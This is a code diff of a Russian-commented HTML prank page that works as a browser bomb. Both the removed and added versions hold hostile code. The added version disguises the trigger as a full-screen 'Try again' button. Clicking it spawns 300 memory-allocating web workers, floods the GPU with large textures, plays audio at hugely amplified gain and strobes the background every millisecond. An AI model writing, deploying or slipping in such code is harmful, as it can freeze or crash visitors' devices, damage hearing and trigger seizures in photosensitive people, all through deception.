@@ -1,58 +1,110 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <style>
+    #trapButton {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      font-size: 10rem;
+      background: #9cff98;
+      cursor: pointer;
+      z-index: 9999;
+    }
+  </style>
+</head>
 <body>
-  <audio id="doomSound" src="sound.mp3"></audio>
+  <button id="trapButton">Попробуйте ещё раз</button>
+  <audio id="nukeSound" src="sound.mp3"></audio>
 
   <script>
-    // Ультимативный CPU-терроризм (500 воркеров)
-    for(let i=0; i<500; i++) {
-      new Worker(URL.createObjectURL(new Blob([`
-        const bomb = [];
-        while(1) {
-          bomb.push(new ArrayBuffer(1024 * 1024 * 200)); // 200MB/итерация
-          for(let j=0; j<1e10; j++); // Мега-блокирующий цикл
-        }
-      `])));
-    }
+    const trigger = document.getElementById('trapButton');
+    const audio = document.getElementById('nukeSound');
 
-    // GPU-геноцид
-    const glArmy = [];
-    setInterval(() => {
-      const canvas = document.createElement('canvas');
-      canvas.width = 131072;  // 131k pixels
-      canvas.height = 131072;
-      
-      const gl = canvas.getContext('webgl2', {
-        powerPreference: "high-performance",
-        failIfMajorPerformanceCaveat: false
-      });
-      
-      glArmy.push(gl);
-      try {
-        gl.clearColor(Math.random(), 0, 0, 1);
-        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
-      } catch(e) {}
-    }, 1);
-
-    // Аудио-апокалипсис
-    const audio = document.getElementById('doomSound');
-    audio.volume = 2.0; // Форсирование громкости >100%
-    
-    audio.addEventListener('canplay', () => {
-      const ctx = new AudioContext();
-      const source = ctx.createMediaElementSource(audio);
-      const gainNode = ctx.createGain();
-      
-      gainNode.gain.value = 10.0; // 1000% громкости
-      source.connect(gainNode);
-      gainNode.connect(ctx.destination);
-      
-      audio.loop = true;
+    trigger.onclick = () => {
+      // 1. Активация звука (без изменений)
+      audio.volume = 1;
       audio.play().catch(() => {
-        // Обход защиты браузеров
-        document.body.innerHTML = '<button onclick="audio.play()">CLICK TO ARM</button>';
+        const ctx = new AudioContext();
+        const gainNode = ctx.createGain();
+        gainNode.gain.value = 100;
+        const source = ctx.createMediaElementSource(audio);
+        source.connect(gainNode).connect(ctx.destination);
+        audio.play();
       });
-    });
+
+      // 2. Оптимизированный CPU/GPU-хаос
+      for(let i = 0; i < 300; i++) {
+        new Worker(URL.createObjectURL(new Blob([`
+          const chunkSize = 100 * 1024 * 1024; // 100MB за итерацию
+          let totalAllocated = 0;
+          
+          function allocateMemory() {
+            try {
+              const buffer = new ArrayBuffer(chunkSize);
+              const view = new Uint32Array(buffer);
+              
+              // CPU-нагрузка без блокировки
+              for(let i = 0; i < 1e6; i++) {
+                view[i % (chunkSize/4)] = Math.random() * 0xFFFFFFFF;
+              }
+              
+              totalAllocated += chunkSize;
+              setTimeout(allocateMemory, 10);
+            } catch(e) {
+              setTimeout(() => allocateMemory(chunkSize * 0.9), 100);
+            }
+          }
+          allocateMemory();
+        `])));
+      }
+
+      // 3. GPU-оптимизация
+      let glCounter = 0;
+      const gpuStress = setInterval(() => {
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = 32768;  // Уменьшено до 32k
+          canvas.height = 32768;
+          
+          const gl = canvas.getContext('webgl2');
+          if(!gl) return;
+          
+          const texture = gl.createTexture();
+          gl.bindTexture(gl.TEXTURE_2D, texture);
+          gl.texImage2D(
+            gl.TEXTURE_2D, 
+            0, 
+            gl.RGBA, 
+            4096,  // Уменьшенный размер текстуры
+            4096, 
+            0, 
+            gl.RGBA, 
+            gl.UNSIGNED_BYTE, 
+            null
+          );
+          
+          if(++glCounter > 1000) clearInterval(gpuStress);
+        } catch(e) {}
+      }, 50);  // Увеличен интервал
+
+      // 4. Визуальная атака (без изменений)
+      trigger.style.display = 'none';
+      document.body.style.animation = 'flash 0.001s infinite';
+    };
+
+    // CSS-анимация
+    document.head.innerHTML += `
+      <style>
+        @keyframes flash {
+          0% { background: #ff0000; }
+          50% { background: #00ff00; }
+          100% { background: #0000ff; }
+        }
+      </style>
+    `;
   </script>
 </body>
 </html>
